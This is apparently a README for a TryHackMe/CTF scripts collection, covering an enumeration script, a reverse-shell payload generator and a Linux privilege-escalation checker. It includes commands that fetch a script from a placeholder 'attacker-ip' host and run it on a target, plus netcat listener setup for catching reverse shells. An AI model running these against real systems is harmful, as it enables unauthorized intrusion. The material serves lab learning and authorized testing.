# 🛠️ TryHackMe Security Scripts

Custom automation scripts developed to streamline penetration testing workflows and security assessments.

---

## 📁 Script Collection

### Enumeration Scripts

**Location:** `enumeration/`

#### auto_enum.sh

Comprehensive automated reconnaissance and enumeration script.

**Features:**
- Automated Nmap scanning (quick, detailed, UDP, vulnerability)
- Web service enumeration (Gobuster, Nikto, WhatWeb)
- SMB enumeration (enum4linux, smbclient)
- DNS and SNMP enumeration when services detected
- Organized output directory structure
- Color-coded progress reporting
- Intelligent service detection

**Usage:**
```bash
./auto_enum.sh <target_ip> [output_dir]

# Example:
./auto_enum.sh 10.10.10.10
./auto_enum.sh 10.10.10.10 scan_results
```

**Requirements:**
- nmap
- gobuster (optional)
- nikto (optional)
- enum4linux (optional)
- smbclient (optional)
- whatweb (optional)

**Output Structure:**
```
enum_<ip>_<timestamp>/
├── nmap/
│   ├── quick_scan.txt
│   ├── detailed_scan.txt
│   ├── udp_scan.txt
│   └── vuln_scan.txt
├── web/
│   ├── gobuster.txt
│   ├── nikto.txt
│   └── whatweb.txt
├── smb/
│   ├── enum4linux.txt
│   └── shares.txt
└── misc/
    ├── dns_query.txt
    └── snmpwalk.txt
```

---

### Exploitation Scripts

**Location:** `exploitation/`

#### revshell_generator.py

Multi-language reverse shell payload generator with 25+ shell types.

**Features:**
- Bash (TCP, UDP, various methods)
- Python (Python 2 & 3 variants)
- PHP (cmd, exec, system, passthru, popen)
- Netcat (multiple variations)
- Perl (with and without /bin/sh)
- Ruby (multiple methods)
- PowerShell (with Base64 encoding)
- Golang, Awk, Java, Lua
- URL encoding for web payloads
- Listener setup instructions
- TTY upgrade guidance

**Usage:**
```bash
python3 revshell_generator.py

# Interactive prompts:
# Enter your IP address (LHOST): 10.10.14.5
# Enter listening port (LPORT) [4444]: 4444
```

**Supported Shell Types:**
- Bash TCP/UDP
- Python/Python3
- PHP variants
- Netcat (mkfifo, -e, -c, BusyBox)
- Perl variants
- Ruby variants
- PowerShell (standard and Base64)
- Golang, Awk, Java, Lua

**Listener Setup:**
```bash
# Basic listener
nc -lvnp 4444

# Better listener with rlwrap
rlwrap nc -lvnp 4444

# TTY upgrade steps included in output
```

---

### Post-Exploitation Scripts

**Location:** `post-exploitation/`

#### linux_privesc_check.sh

Comprehensive Linux privilege escalation enumeration script.

**Features:**
- System information gathering
- User and group enumeration
- Sudo privilege checking
- SUID/SGID binary discovery
- Writable files and directories
- Cron job analysis
- Network configuration
- Running process enumeration
- Interesting file discovery
- Development tools detection
- Capability checking
- Environment variable analysis
- Mounted file systems
- Kernel exploit suggestions
- Actionable recommendations

**Usage:**
```bash
./linux_privesc_check.sh

# Can be run directly on target system
# Or download and execute:
wget http://attacker-ip/linux_privesc_check.sh
chmod +x linux_privesc_check.sh
./linux_privesc_check.sh
```

**Checks Performed:**
1. System & kernel information
2. User accounts and permissions
3. Sudo configuration (sudo -l)
4. SUID/SGID binaries
5. Writable system files
6. Scheduled tasks (cron)
7. Network connections and services
8. Running processes
9. Password files and history
10. SSH keys and credentials
11. Installed software and compilers
12. File capabilities
13. Environment variables
14. NFS configurations

---

### Utilities

**Location:** `utilities/`

Additional helper scripts for common pentesting tasks.

---

## 🔧 Installation

### Clone Repository

```bash
git clone https://github.com/AlperKurtulus/ctf-security-portfolio.git
cd ctf-security-portfolio/tryhackme/scripts
```

### Make Scripts Executable

```bash
chmod +x enumeration/auto_enum.sh
chmod +x exploitation/revshell_generator.py
chmod +x post-exploitation/linux_privesc_check.sh
```

### Install Dependencies

#### For auto_enum.sh:

```bash
# Debian/Ubuntu
sudo apt install nmap gobuster nikto enum4linux smbclient whatweb

# Kali Linux (most tools pre-installed)
sudo apt update
```

#### For revshell_generator.py:

```bash
# Python 3 (usually pre-installed)
python3 --version

# No additional dependencies required
```

#### For linux_privesc_check.sh:

```bash
# No dependencies - uses standard Linux commands
# Should work on any Linux distribution
```

---

## 📚 Usage Examples

### Scenario 1: Initial Target Enumeration

```bash
# Run comprehensive enumeration
./enumeration/auto_enum.sh 10.10.10.10

# Review results
cd enum_10.10.10.10_*/
cat nmap/detailed_scan.txt
cat web/gobuster.txt
```

### Scenario 2: Web Shell to Reverse Shell

```bash
# Generate reverse shell payloads
python3 exploitation/revshell_generator.py
# Enter your IP and port

# Set up listener on attacking machine
nc -lvnp 4444

# Copy and execute appropriate payload on target
# (via web shell, command injection, etc.)
```

### Scenario 3: Linux Privilege Escalation

```bash
# After gaining initial access, transfer script
# On attacker machine:
python3 -m http.server 8000

# On target machine:
wget http://attacker-ip:8000/linux_privesc_check.sh
chmod +x linux_privesc_check.sh
./linux_privesc_check.sh

# Review output for privilege escalation vectors
```

---

## 🎯 Best Practices

### Script Usage

1. **Always get authorization** before running scripts on any system
2. **Test in safe environments** first (VMs, labs, CTF platforms)
3. **Review script output** carefully for sensitive information
4. **Document findings** from script results
5. **Use version control** to track script modifications

### Operational Security

1. **Clean up after testing** - remove scripts and artifacts
2. **Use VPNs** when connecting to remote systems
3. **Secure your tools** - don't leave payloads on public servers
4. **Log your activities** for reporting and accountability

### Ethical Considerations

- Only use on authorized targets
- Respect scope limitations
- Follow responsible disclosure practices
- Comply with applicable laws and regulations

---

## 🔍 Troubleshooting

### auto_enum.sh Issues

**Problem:** Nmap not found
```bash
# Solution: Install nmap
sudo apt install nmap
```

**Problem:** Permission denied for UDP scan
```bash
# Solution: UDP scanning requires root
sudo ./auto_enum.sh 10.10.10.10
```

### revshell_generator.py Issues

**Problem:** Python not found
```bash
# Solution: Install Python 3
sudo apt install python3
```

**Problem:** Shells not working
- Verify IP address is correct (use `ip a` or `ifconfig`)
- Check firewall rules
- Ensure listener is running before executing payload

### linux_privesc_check.sh Issues

**Problem:** Permission denied
```bash
# Solution: Make executable
chmod +x linux_privesc_check.sh
```

**Problem:** Some checks fail
- Normal - some checks require specific permissions
- Review what succeeded for useful information

---

## 🚀 Future Development

Planned additions:

- [ ] Windows enumeration script
- [ ] Active Directory enumeration
- [ ] Automated exploit suggester
- [ ] Report generation tools
- [ ] Web vulnerability scanner
- [ ] Password spraying utilities
- [ ] Credential harvesting scripts

---

## 📖 References

### Tool Documentation

- [Nmap](https://nmap.org/docs.html)
- [Gobuster](https://github.com/OJ/gobuster)
- [Nikto](https://github.com/sullo/nikto)
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)

### Technique References

- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)

---

## ⚖️ Legal Disclaimer

**⚠️ IMPORTANT: Authorized Use Only**

These scripts are provided for **educational purposes and authorized security testing only**.

**Legal Usage:**
- ✅ Authorized penetration testing
- ✅ Personal lab environments
- ✅ CTF competitions
- ✅ Educational platforms (TryHackMe, HackTheBox)

**Illegal Usage:**
- ❌ Unauthorized network scanning
- ❌ Exploitation of systems without permission
- ❌ Any activity violating laws or regulations

**By using these scripts, you agree to:**
1. Only test systems you own or have written authorization to test
2. Comply with all applicable laws
3. Use responsibly and ethically
4. Accept full responsibility for your actions

The author assumes no liability for misuse of these tools.

---

*Scripts are continuously updated and improved based on real-world testing experience.*
